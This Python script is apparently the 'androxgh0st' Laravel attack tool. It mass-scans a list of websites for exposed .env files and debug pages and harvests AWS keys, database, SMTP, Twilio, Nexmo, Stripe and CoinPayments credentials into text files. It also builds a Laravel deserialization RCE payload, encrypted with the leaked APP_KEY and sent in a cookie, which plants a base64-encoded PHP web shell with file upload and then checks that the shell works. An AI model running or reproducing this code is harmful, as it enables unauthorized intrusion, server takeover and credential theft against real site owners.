# -*- coding: utf-8 -*-
''' So many people who love you. Don't focus on the people who don't. xD '''

import hmac, hashlib, json, requests, re, threading, time, random, sys, os, urlparse
requests.packages.urllib3.disable_warnings()
from threading import *
from threading import Thread
from ConfigParser import ConfigParser
from Queue import Queue
from hashlib import sha256
from base64 import b64decode
from base64 import b64encode
from Crypto import Random
from Crypto.Cipher import AES

# output name configure
o_aws_access = 'aws_access.txt'
o_database = 'database.txt'
o_database_root = 'db-root.txt'
lo_smtp = 'localhost.txt'
x_smtp = 'smtp-unch.txt'
s_smtp = 'smtp-sendgrid.txt'
a_smtp = 'smtp-amazon.txt'
g_smtp = 'smtp-gmail.txt'
m_smtp = 'smtp-mailtrap.txt'
o_smtp = 'smtp-random.txt'
o_twilio = 'twilio.txt'
o_nexmo = 'nexmo.txt'
o_stripe = 'stripe.txt'
o_cps = 'coinpayments.txt'
o_shell = 'shell.txt'
o_done = 'done.txt'
pid_restore = '.androxgh0st_laravel'
progres = 0

BLOCK_SIZE = 16
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * \
                chr(BLOCK_SIZE - len(s) % BLOCK_SIZE)
unpad = lambda s: s[:-ord(s[len(s) - 1:])]

class Worker(Thread):
    def __init__(self, tasks):
        Thread.__init__(self)
        self.tasks = tasks
        self.daemon = True
        self.start()

    def run(self):
        while True:
            func, args, kargs = self.tasks.get()
            try: func(*args, **kargs)
            except Exception, e: print e
            self.tasks.task_done()

class ThreadPool:
    def __init__(self, num_threads):
        self.tasks = Queue(num_threads)
        for _ in range(num_threads): Worker(self.tasks)

    def add_task(self, func, *args, **kargs):
        self.tasks.put((func, args, kargs))

    def wait_completion(self):
        self.tasks.join()

class androxgh0st:
    ''' There is no failure except in no longer trying. xD '''  
    def encrypt(self, raw, key):
        raw = pad(raw)
        iv = Random.new().read(AES.block_size)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        rawco = cipher.encrypt(raw)
        mac = hmac.new(key, b64encode(iv)+b64encode(rawco), hashlib.sha256).hexdigest()
        value = b64encode(rawco)
        iv = b64encode(iv)
        data = {}
        data['iv'] = str(iv)
        data['value'] = str(value)
        data['mac'] = str(mac)
        json_data = json.dumps(data)
        return  json_data

    def get_aws_data(self, text, url):
        try:
            if "AWS_ACCESS_KEY_ID" in text:
                if "AWS_ACCESS_KEY_ID=" in text:
                    aws_key = re.findall("\nAWS_ACCESS_KEY_ID=(.*?)\n", text)[0]
                    aws_sec = re.findall("\nAWS_SECRET_ACCESS_KEY=(.*?)\n", text)[0]
                elif "<td>AWS_ACCESS_KEY_ID</td>" in text:
                    aws_key = re.findall("<td>AWS_ACCESS_KEY_ID<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    aws_sec = re.findall("<td>AWS_SECRET_ACCESS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                if aws_key == "" and aws_sec == "":
                    return False
                else:
                    pack = str(url) + '|' + str(aws_key) + '|' + str(aws_sec)
                    babi = str(pack).replace('\r', '')
                    save = open(o_aws_access, 'a')
                    save.write(babi + '\n')
                    save.close()
                return True
            elif "AWS_KEY" in text:
                if "AWS_KEY=" in text:
                    aws_key = re.findall("\nAWS_KEY=(.*?)\n", text)[0]
                    aws_sec = re.findall("\nAWS_SECRET=(.*?)\n", text)[0]
                elif "<td>AWS_KEY</td>" in text:
                    aws_key = re.findall("<td>AWS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    aws_sec = re.findall("<td>AWS_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                if aws_key == "" and aws_sec == "":
                    return False
                else:
                    pack = str(url) + '|' + str(aws_key) + '|' + str(aws_sec)
                    babi = str(pack).replace('\r', '')
                    save = open(o_aws_access, 'a')
                    save.write(babi + '\n')
                    save.close()
                return True
            elif "SES_KEY" in text:
                if "SES_KEY=" in text:
                    aws_key = re.findall("\nSES_KEY=(.*?)\n", text)[0]
                    aws_sec = re.findall("\nSES_SECRET=(.*?)\n", text)[0]
                elif "<td>SES_KEY</td>" in text:
                    aws_key = re.findall("<td>SES_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    aws_sec = re.findall("<td>SES_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                if aws_key == "" and aws_sec == "":
                    return False
                else:
                    pack = str(url) + '|' + str(aws_key) + '|' + str(aws_sec)
                    babi = str(pack).replace('\r', '')
                    save = open(o_aws_access, 'a')
                    save.write(babi + '\n')
                    save.close()
                return True
            else:
                return False
        except:
            return False

    def get_database(self, text, url):
        try:
            if "DB_USERNAME" in text:
                if "DB_USERNAME=" in text:
                    dbhost = re.findall("\nDB_HOST=(.*?)\n", text)[0]
                    dbport = re.findall("\nDB_PORT=(.*?)\n", text)[0]
                    dbuser = re.findall("\nDB_USERNAME=(.*?)\n", text)[0]
                    dbpass = re.findall("\nDB_PASSWORD=(.*?)\n", text)[0]
                elif "<td>DB_USERNAME</td>" in text:
                    dbhost = re.findall('<td>DB_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    dbport = re.findall('<td>DB_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    dbuser = re.findall('<td>DB_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    dbpass = re.findall('<td>DB_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                if dbuser == "null" or dbpass == "null":
                    return False
                else:
                    if str(dbuser) == "root":
                        pack = str(url) + '|' + str(dbhost) + '|' + str(dbport) + '|' + str(dbuser) + '|' + str(dbpass)
                        save = open(o_database_root, 'a')
                        babi = str(pack).replace('\r', '')
                        save.write(babi + '\n')
                        save.close()
                    else:
                        pack = str(url) + '|' + str(dbhost) + '|' + str(dbport) + '|' + str(dbuser) + '|' + str(dbpass)
                        save = open(o_database, 'a')
                        babi = str(pack).replace('\r', '')
                        save.write(babi + '\n')
                        save.close()
                    return True
            else:
                return False
        except:
            return False

    def get_env(self, text, url):
        #headers = {'User-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36'}
        #text = requests.get(url+"/.env", headers=headers, timeout=8, verify=False, allow_redirects=False).text
        if "APP_KEY" in text:
            if "APP_KEY=" in text:
                appkey = re.findall("APP_KEY=([a-zA-Z0-9:;\/\\=$%^&*()-+_!@#]+)", text)[0]
            else:
                #text = requests.post(url, data={"0x[]":"androxgh0st"}, headers=headers, timeout=8, verify=False, allow_redirects=False).text
                if "<td>APP_KEY</td>" in text:
                    appkey = re.findall("<td>APP_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
            if appkey:
                if '"' in appkey or "'" in appkey:
                    appkey = appkey[1:-1]
                return appkey
            else:
                return False
        else:
            return False

    def get_smtp(self, text, url):
        try:
            if "MAIL_HOST" in text:
                if "MAIL_HOST=" in text:
                    mailhost = re.findall("\nMAIL_HOST=(.*?)\n", text)[0]
                    mailport = re.findall("\nMAIL_PORT=(.*?)\n", text)[0]
                    mailuser = re.findall("\nMAIL_USERNAME=(.*?)\n", text)[0]
                    mailpass = re.findall("\nMAIL_PASSWORD=(.*?)\n", text)[0]
                    mailadrs = re.findall("\nMAIL_FROM_ADDRESS=(.*?)\n", text)[0]
                elif "<td>MAIL_HOST</td>" in text:
                    mailhost = re.findall('<td>MAIL_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailport = re.findall('<td>MAIL_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailuser = re.findall('<td>MAIL_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailpass = re.findall('<td>MAIL_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailadrs = re.findall('<td>MAIL_FROM_ADDRESS<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                if mailuser == "null" or mailpass == "null" or mailuser == "" or mailpass == "" or mailadrs == "":
                    return False
                else:
                    if 'amazonaws' in mailhost:
                        pack = str(url) + '|' + str(mailhost) + '|' + str(mailport) + '|' + str(mailuser) + '|' + str(mailpass) + '|' + str(mailadrs)
                        save = open(a_smtp, 'a')
                        babi = str(pack).replace('\r', '')
                        save.write(babi + '\n')
                        save.close()
                    elif 'smtp.office365.com' in mailhost:
                        pack = str(url) + '|' + str(mailhost) + '|' + str(mailport) + '|' + str(mailuser) + '|' + str(mailpass)
                        save = open(x_smtp, 'a')
                        babi = str(pack).replace('\r', '')
                        save.write(babi + '\n')
                        save.close()
                    elif 'localhost' in mailhost:
                        pack = str(url) + '|' + str(mailhost) + '|' + str(mailport) + '|' + str(mailuser) + '|' + str(mailpass)
                        save = open(lo_smtp, 'a')
                        babi = str(pack).replace('\r', '')
                        save.write(babi + '\n')
                        save.close()
                    elif '.amazonaws.com' in mailhost:
                        pack = str(url) + '|' + str(mailhost) + '|' + str(mailport) + '|' + str(mailuser) + '|' + str(mailpass)
                        save = open(a_smtp, 'a')
                        babi = str(pack).replace('\r', '')
                        save.write(babi + '\n')
                        save.close()
                    elif 'smtp-relay.sendinblue.com' in mailhost:
                        pack = str(url) + '|' + str(mailhost) + '|' + str(mailport) + '|' + str(mailuser) + '|' + str(mailpass)
                        save = open(x_smtp, 'a')
                        babi = str(pack).replace('\r', '')
                        save.write(babi + '\n')
                        save.close()
                    elif 'smtp.hostinger.' in mailhost:
                        pack = str(url) + '|' + str(mailhost) + '|' + str(mailport) + '|' + str(mailuser) + '|' + str(mailpass)
                        save = open(x_smtp, 'a')
                        babi = str(pack).replace('\r', '')
                        save.write(babi + '\n')
                        save.close()
                    elif 'smtp.ionos.' in mailhost:
                        pack = str(url) + '|' + str(mailhost) + '|' + str(mailport) + '|' + str(mailuser) + '|' + str(mailpass)
                        save = open(x_smtp, 'a')
                        babi = str(pack).replace('\r', '')
                        save.write(babi + '\n')
                        save.close()
                    elif 'smtp.1and1.' in mailhost:
                        pack = str(url) + '|' + str(mailhost) + '|' + str(mailport) + '|' + str(mailuser) + '|' + str(mailpass)
                        save = open(x_smtp, 'a')
                        babi = str(pack).replace('\r', '')
                        save.write(babi + '\n')
                        save.close()
                    elif 'smtp.zoho.com' in mailhost:
                        pack = str(url) + '|' + str(mailhost) + '|' + str(mailport) + '|' + str(mailuser) + '|' + str(mailpass)
                        save = open(x_smtp, 'a')
                        babi = str(pack).replace('\r', '')
                        save.write(babi + '\n')
                        save.close()
                    elif 'in-v3.mailjet.com' in mailhost:
                        pack = str(url) + '|' + str(mailhost) + '|' + str(mailport) + '|' + str(mailuser) + '|' + str(mailpass)
                        save = open(x_smtp, 'a')
                        babi = str(pack).replace('\r', '')
                        save.write(babi + '\n')
                        save.close()
                    elif 'smtp.1und1.' in mailhost:
                        pack = str(url) + '|' + str(mailhost) + '|' + str(mailport) + '|' + str(mailuser) + '|' + str(mailpass)
                        save = open(x_smtp, 'a')
                        babi = str(pack).replace('\r', '')
                        save.write(babi + '\n')
                        save.close()
                    elif 'mailout.one.com' in mailhost:
                        pack = str(url) + '|' + str(mailhost) + '|' + str(mailport) + '|' + str(mailuser) + '|' + str(mailpass)
                        save = open(x_smtp, 'a')
                        babi = str(pack).replace('\r', '')
                        save.write(babi + '\n')
                        save.close()
                    elif 'smtp.googlemail.com' in mailhost:
                        pack = str(url) + '|' + str(mailhost) + '|' + str(mailport) + '|' + str(mailuser) + '|' + str(mailpass)
                        save = open(g_smtp, 'a')
                        babi = str(pack).replace('\r', '')
                        save.write(babi + '\n')
                        save.close()
                    elif 'smtp-relay.gmail.com' in mailhost:
                        pack = str(url) + '|' + str(mailhost) + '|' + str(mailport) + '|' + str(mailuser) + '|' + str(mailpass)
                        save = open(g_smtp, 'a')
                        babi = str(pack).replace('\r', '')
                        save.write(babi + '\n')
                        save.close()
                    elif 'smtp.gmail.com' in mailhost:
                        pack = str(url) + '|' + str(mailhost) + '|' + str(mailport) + '|' + str(mailuser) + '|' + str(mailpass)
                        save = open(g_smtp, 'a')
                        babi = str(pack).replace('\r', '')
                        save.write(babi + '\n')
                        save.close()
                    elif 'smtp.mailtrap.io' in mailhost:
                        pack = str(url) + '|' + str(mailhost) + '|' + str(mailport) + '|' + str(mailuser) + '|' + str(mailpass)
                        save = open(m_smtp, 'a')
                        babi = str(pack).replace('\r', '')
                        save.write(babi + '\n')
                        save.close()
                    elif 'smtp.mailgun.org' in mailhost:
                        pack = str(url) + '|' + str(mailhost) + '|' + str(mailport) + '|' + str(mailuser) + '|' + str(mailpass)
                        save = open(x_smtp, 'a')
                        babi = str(pack).replace('\r', '')
                        save.write(babi + '\n')
                        save.close()
                    elif 'smtp.sendgrid.net' in mailhost:
                        pack = str(url) + '|' + str(mailhost) + '|' + str(mailport) + '|' + str(mailuser) + '|' + str(mailpass)
                        save = open(s_smtp, 'a')
                        babi = str(pack).replace('\r', '')
                        save.write(babi + '\n')
                        save.close()
                    elif 'smtp.mandrillapp.com' in mailhost:
                        pack = str(url) + '|' + str(mailhost) + '|' + str(mailport) + '|' + str(mailuser) + '|' + str(mailpass) + '|' + str(mailadrs)
                        save = open(x_smtp, 'a')
                        babi = str(pack).replace('\r', '')
                        save.write(babi + '\n')
                        save.close()
                    else:
                        pack = str(url) + '|' + str(mailhost) + '|' + str(mailport) + '|' + str(mailuser) + '|' + str(mailpass)
                        save = open(o_smtp, 'a')
                        babi = str(pack).replace('\r', '')
                        save.write(babi + '\n')
                        save.close()
                    return True
            else:
                return False
        except:
            return False

    def get_twilio(self, text, url):
        try:
            if "TWILIO_ACCOUNT_SID" in text:
                if "TWILIO_ACCOUNT_SID=" in text:
                    twilio_acc_sid = re.findall("\nTWILIO_ACCOUNT_SID=(.*?)\n", text)[0]
                    twilio_auth = re.findall("\nTWILIO_AUTH_TOKEN=(.*?)\n", text)[0]
                elif "<td>TWILIO_ACCOUNT_SID</td>" in text:
                    twilio_acc_sid = re.findall('<td>TWILIO_ACCOUNT_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    twilio_auth = re.findall('<td>TWILIO_AUTH_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                if twilio_acc_sid == "" or twilio_auth == "":
                    return False
                else:
                    pack = str(url) + '|' + str(twilio_acc_sid) + ':' + str(twilio_auth)
                    save = open(o_twilio, 'a')
                    babi = str(pack).replace('\r', '')
                    save.write(babi + '\n')
                    save.close()
                return True
            elif "TWILIO" in text:
                if "TWILIO_SID=" in text:
                    twilio_acc_sid = re.findall("\nTWILIO_SID=(.*?)\n", text)[0]
                    twilio_auth = re.findall("\nTWILIO_TOKEN=(.*?)\n", text)[0]
                elif "<td>TWILIO_SID</td>" in text:
                    twilio_acc_sid = re.findall('<td>TWILIO_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    twilio_auth = re.findall('<td>TWILIO_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                if twilio_acc_sid == "" or twilio_auth == "":
                    return False
                else:
                    pack = str(url) + '|' + str(twilio_acc_sid) + ':' + str(twilio_auth)
                    save = open(o_twilio, 'a')
                    babi = str(pack).replace('\r', '')
                    save.write(babi + '\n')
                    save.close()
                    return True
            else:
                return False
        except:
            return False

    def get_nexmo(self, text, url):
        try:
            if "NEXMO_KEY" in text:
                if "NEXMO_KEY=" in text:
                    nexmokey = re.findall("\nNEXMO_KEY=(.*?)\n", text)[0]
                    nexmosec = re.findall("\nNEXMO_SECRET=(.*?)\n", text)[0]
                elif "<td>NEXMO_KEY</td>" in text:
                    nexmokey = re.findall('<td>NEXMO_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    nexmosec = re.findall('<td>NEXMO_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                if nexmokey == "" or nexmosec == "":
                    return False
                else:
                    pack = str(url) + '|' + str(nexmokey) + ':' + str(nexmosec)
                    save = open(o_nexmo, 'a')
                    babi = str(pack).replace('\r', '')
                    save.write(babi + '\n')
                    save.close()
                return True
            elif "NEXMO_API_KEY" in text:
                if "NEXMO_API_KEY=" in text:
                    nexmokey = re.findall("\nNEXMO_API_KEY=(.*?)\n", text)[0]
                    nexmosec = re.findall("\nNEXMO_API_SECRET=(.*?)\n", text)[0]
                elif "<td>NEXMO_API_KEY</td>" in text:
                    nexmokey = re.findall('<td>NEXMO_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    nexmosec = re.findall('<td>NEXMO_API_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                if nexmokey == "" or nexmosec == "":
                    return False
                else:
                    pack = str(url) + '|' + str(nexmokey) + ':' + str(nexmosec)
                    save = open(o_nexmo, 'a')
                    babi = str(pack).replace('\r', '')
                    save.write(babi + '\n')
                    save.close()
                return True
            else:
                return False
        except:
            return False

    def get_stripe(self, text, url):
        try:
            if "STRIPE_SECRET" in text:
                if "STRIPE_SECRET=" in text:
                    stripesec = re.findall("\nSTRIPE_SECRET=(.*?)\n", text)[0]
                    stripekey = re.findall("\nSTRIPE_KEY=(.*?)\n", text)[0]
                elif "<td>STRIPE_SECRET=</td>" in text:
                    stripesec = re.findall('<td>STRIPE_SECRET=<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    stripekey = re.findall('<td>STRIPE_KEY=<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                if stripesecret == "null" or stripekey == "null":
                    return False
                else:
                    pack = str(url) + '|' + str(stripesec) + ':' + str(stripekey)
                    save = open(o_stripe, 'a')
                    babi = str(pack).replace('\r','')
                    save.write(babi + '\n')
                    save.close
                return True
            else:
                return False
        except:
            return False

    def get_cps(self, text, url):
        try:
            if "COINPAYMENTS_PUBLIC_KEY" in text:
                if "COINPAYMENTS_PUBLIC_KEY=" in text:
                    cpspub = re.findall("\nCOINPAYMENTS_PUBLIC_KEY=(.*?)\n", text)[0]
                    cpsprv = re.findall("\nCOINPAYMENTS_PRIVATE_KEY=(.*?)\n", text)[0]
                elif "<td>COINPAYMENTS_PUBLIC_KEY</td>" in text:
                    cpspub = re.findall('<td>COINPAYMENTS_PUBLIC_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    cpsprv = re.findall('<td>COINPAYMENTS_PRIVATE_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                if cpspub == "" or cpsprv == "":
                    return False
                else:
                    pack = str(url) + '\nCOINPAYMENTS_PUBLIC_KEY: ' + str(cpspub) + '\nCOINPAYMENTS_PRIVATE_KEY: ' + str(cpsprv)+'\n'
                    save = open(o_cps, 'a')
                    babi = str(pack).replace('\r', '')
                    save.write(babi + '\n')
                    save.close()
                return True
            elif "CPS_PUBLIC_KEY" in text:
                if "CPS_PUBLIC_KEY=" in text:
                    cpspub = re.findall("\nCPS_PUBLIC_KEY=(.*?)\n", text)[0]
                    cpsprv = re.findall("\nCPS_PRIVATE_KEY=(.*?)\n", text)[0]
                elif "<td>CPS_PUBLIC_KEY</td>" in text:
                    cpspub = re.findall('<td>CPS_PUBLIC_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    cpsprv = re.findall('<td>CPS_PRIVATE_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                if cpspub == "" or cpsprv == "":
                    return False
                else:
                    pack = str(url) + '\nCPS_PUBLIC_KEY: ' + str(cpspub) + '\nCPS_PRIVATE_KEY: ' + str(cpsprv)+'\n'
                    save = open(o_cps, 'a')
                    babi = str(pack).replace('\r', '')
                    save.write(babi + '\n')
                    save.close()
                    return True
            else:
                return False
        except:
            return False

def printf(text):
    ''.join([str(item) for item in text])
    print(text + '\n'),

def exploit(url):
    global progres
    resp = False
    try:
        text = '\033[32;1m#\033[0m '+url
        headers = {'User-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36'}
        get_source = requests.get(url+"/.env", headers=headers, timeout=8, verify=False, allow_redirects=False).text
        if "APP_KEY=" in get_source:
            resp = get_source
        else:
            get_source = requests.post(url, data={"0x[]":"androxgh0st"}, headers=headers, timeout=8, verify=False, allow_redirects=False).text
            if "<td>APP_KEY</td>" in get_source:
                resp = get_source
        if resp:
            getsmtp = androxgh0st().get_smtp(resp, url)
            stripe = androxgh0st().get_stripe(resp, url)
            twilio = androxgh0st().get_twilio(resp, url)
            nexmo = androxgh0st().get_nexmo(resp, url)
            cps = androxgh0st().get_cps(resp, url)
            getkey = androxgh0st().get_env(resp, url)
            getdb = androxgh0st().get_database(resp, url)
            getaws = androxgh0st().get_aws_data(resp, url)
            if getsmtp:
                text += ' | \033[32;1mSMTP\033[0m'
            else:
                text += ' | \033[31;1mSMTP\033[0m'
            if twilio:
                text += ' | \033[32;1mTWILIO\033[0m'
            else:
                text += ' | \033[31;1mTWILIO\033[0m'
            if stripe:
                text += ' | \033[32;1mSTRIPE\033[0m'
            else:
                text += ' | \033[31;1mSTRIPE\033[0m'
            if nexmo:
                text += ' | \033[32;1mNEXMO\033[0m'
            else:
                text += ' | \033[31;1mNEXMO\033[0m'
            if cps:
                text += ' | \033[32;1mCOINPAYMENTS\033[0m'
            else:
                text += ' | \033[31;1mCOINPAYMENTS\033[0m'
            if getdb:
                text += ' | \033[32;1mDATABASE\033[0m'
            else:
                text += ' | \033[31;1mDATABASE\033[0m'
            if getaws:
                text += ' | \033[32;1mAWS\033[0m'
            else:
                text += ' | \033[31;1mAWS\033[0m'
            if getkey:
                api_key = getkey.replace('base64:', '')
                key = b64decode(api_key)
                xnxx = androxgh0st().encrypt(msg6, key)
                matamu = b64encode(str(xnxx))
                cokk = {"XSRF-TOKEN": matamu}
                curler = requests.get(url, cookies=cokk, verify=False, timeout=8, headers=headers).text
                y = curler.split("</html>")[1]
                cekshell = requests.get(url + '/Chit0ge.php?Chitoge', verify=False, timeout=8, headers=headers).text
                if 'Chitoge kirisaki <3' in cekshell:
                    text += ' | \033[32;1mRCE\033[0m'
                    save = open(o_shell, 'a')
                    save.write(url + '/Chit0ge.php?Chitoge' + '\n')
                    save.close()
                else:
                    text += ' | \033[31;1mRCE\033[0m'
                    save =open(o_done, 'a')
                    save.write(url + '\n')
                    save.close()
            else:
                text += ' | \033[31;1mCan\'t get everything\033[0m'
                save =open(o_done, 'a')
                save.write(url + '\n')
                save.close()
        else:
            text += ' | \033[31;1mCan\'t get everything\033[0m'
            save =open(o_done, 'a')
            save.write(url + '\n')
            save.close()
    except Exception as err:
        text = '\033[31;1m#\033[0m '+url
        text += ' | \033[31;1mCan\'t access sites\033[0m '
        save =open(o_done, 'a')
        save.write(url + '\n')
        save.close()
    progres = progres + 1
    printf(str(progres) + text)


# PHP Payload
p = '<?php $root = $_SERVER["DOCUMENT_ROOT"]; $myfile = fopen($root . "/Chit0ge.php", "w") or die("Unable to open file!"); $code = "PD9waHAKZXJyb3JfcmVwb3J0aW5nKDApOwoKaWYoaXNzZXQoJF9HRVRbIkNoaXRvZ2UiXSkpIHsKICAgIGVjaG8gIjxoMT48aT5DaGl0b2dlIGtpcmlzYWtpIDwzPC9pPjwvaDE+PGJyPiI7CiAgICBlY2hvICI8Yj48cGhwdW5hbWU+Ii5waHBfdW5hbWUoKS4iPC9waHB1bmFtZT48L2I+PGJyPiI7CiAgICBlY2hvICI8Zm9ybSBtZXRob2Q9J3Bvc3QnIGVuY3R5cGU9J211bHRpcGFydC9mb3JtLWRhdGEnPgogICAgICAgICAgPGlucHV0IHR5cGU9J2ZpbGUnIG5hbWU9J2lkeF9maWxlJz4KICAgICAgICAgIDxpbnB1dCB0eXBlPSdzdWJtaXQnIG5hbWU9J3VwbG9hZCcgdmFsdWU9J3VwbG9hZCc+CiAgICAgICAgICA8L2Zvcm0+IjsKICAgICRyb290ID0gJF9TRVJWRVJbJ0RPQ1VNRU5UX1JPT1QnXTsKICAgICRmaWxlcyA9ICRfRklMRVNbJ2lkeF9maWxlJ11bJ25hbWUnXTsKICAgICRkZXN0ID0gJHJvb3QuJy8nLiRmaWxlczsKICAgIGlmKGlzc2V0KCRfUE9TVFsndXBsb2FkJ10pKSB7CiAgICAgICAgaWYoaXNfd3JpdGFibGUoJHJvb3QpKSB7CiAgICAgICAgICAgIGlmKEBjb3B5KCRfRklMRVNbJ2lkeF9maWxlJ11bJ3RtcF9uYW1lJ10sICRkZXN0KSkgewogICAgICAgICAgICAgICAgJHdlYiA9ICJodHRwOi8vIi4kX1NFUlZFUlsnSFRUUF9IT1NUJ107CiAgICAgICAgICAgICAgICBlY2hvICJTdWtzZXMgLT4gPGEgaHJlZj0nJHdlYi8kZmlsZXMnIHRhcmdldD0nX2JsYW5rJz48Yj48dT4kd2ViLyRmaWxlczwvdT48L2I+PC9hPiI7CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICBlY2hvICJnYWdhbCB1cGxvYWQgZGkgZG9jdW1lbnQgcm9vdC4iOwogICAgICAgICAgICB9CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgaWYoQGNvcHkoJF9GSUxFU1snaWR4X2ZpbGUnXVsndG1wX25hbWUnXSwgJGZpbGVzKSkgewogICAgICAgICAgICAgICAgZWNobyAic3Vrc2VzIHVwbG9hZCA8Yj4kZmlsZXM8L2I+IGRpIGZvbGRlciBpbmkiOwogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgZWNobyAiZ2FnYWwgdXBsb2FkIjsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfSBlbHNlIHsKICAgIGhlYWRlcignSFRUUC8xLjEgNDAzIEZPUkJJRERFTicpOwp9Cj8+"; fwrite($myfile, base64_decode($code)); fclose($myfile); echo("kaneki.dev7@gmail.com"); ?>'
msg6 = 'O:29:"Illuminate\Support\MessageBag":2:{s:11:"' + "\x00" + '*' + "\x00" + 'messages";a:0:{}s:9:"' + "\x00" + '*' + "\x00" + 'format";O:XMR:"Illuminate\Bus\Dispatcher":1:{s:16:"' + "\x00" + '*' + "\x00" + 'queueResolver";a:2:{i:0;O:25:"Mockery\Loader\EvalLoader":0:{}i:1;s:4:"load";}}s:8:"' + "\x00" + '*' + "\x00" + 'event";O:38:"Illuminate\Broadcasting\BroadcastEvent":1:{s:10:"connection";O:32:"Mockery\Generator\MockDefinition":2:{s:9:"' + "\x00" + '*' + "\x00" + 'config";O:35:"Mockery\Generator\MockConfiguration":1:{s:7:"' + "\x00" + '*' + "\x00" + 'name";s:7:"abcdefg";}s:7:"' + "\x00" + '*' + "\x00" + 'code";s:' + str(len(p)) + ':"' + p + '";}}}}'

if __name__ == '__main__':
    print('''
──────▄▀▄─────▄▀▄
─────▄█░░▀▀▀▀▀░░█▄
─▄▄──█░░░░░░░░░░░█──▄▄
█▄▄█─█░░▀░░┬░░▀░░█─█▄▄█  
███████╗██╗░░░██╗░█████╗░███████╗██╗░░██╗
██╔════╝██║░░░██║██╔══██╗██╔════╝██║░██╔╝
█████╗░░██║░░░██║██║░░╚═╝█████╗░░█████═╝░
██╔══╝░░██║░░░██║██║░░██╗██╔══╝░░██╔═██╗░
██║░░░░░╚██████╔╝╚█████╔╝███████╗██║░╚██╗
╚═╝░░░░░░╚═════╝░░╚════╝░╚══════╝╚═╝░░╚═╝
LARAVEL \033[32;1mSEMPAKER\033[0m V6.9________ \n''')
    try:
        readcfg = ConfigParser()
        readcfg.read(pid_restore)
        lists = readcfg.get('DB', 'FILES')
        numthread = readcfg.get('DB', 'THREAD')
        sessi = readcfg.get('DB', 'SESSION')
        print("log session bot found! restore session")
        print('''Using Configuration :\n\tFILES='''+lists+'''\n\tTHREAD='''+numthread+'''\n\tSESSION='''+sessi)
        tanya = raw_input("Want to contineu session ? [Y/n] ")
        if "Y" in tanya or "y" in tanya:
            lerr = open(lists).read().split("\n"+sessi)[1]
            readsplit = lerr.splitlines()
        else:
            kntl # Send Error Biar Lanjut Ke Wxception :v
    except:
        try:
            lists = sys.argv[1]
            numthread = sys.argv[2]
            readsplit = open(lists).read().splitlines()
        except:
            try:
                lists = raw_input("websitelist ? ")
                readsplit = open(lists).read().splitlines()
            except:
                print("Wrong input or list not found!")
                exit()
            try:
                numthread = raw_input("threads ? ")
            except:
                print("Wrong thread number!")
                exit()
    pool = ThreadPool(int(numthread))
    for url in readsplit:
        if "://" in url:
            url = url
        else:
            url = "http://"+url
        if url.endswith('/'):
            url = url[:-1]
        jagases = url
        try:
            pool.add_task(exploit, url)
        except KeyboardInterrupt:
            session = open(pid_restore, 'w')
            cfgsession = "[DB]\nFILES="+lists+"\nTHREAD="+str(numthread)+"\nSESSION="+jagases+"\n"
            session.write(cfgsession)
            session.close()
            print("CTRL+C Detect, Session saved")
            exit()
    pool.wait_completion()
    try:
        os.remove(pid_restore)
    except:
        pass
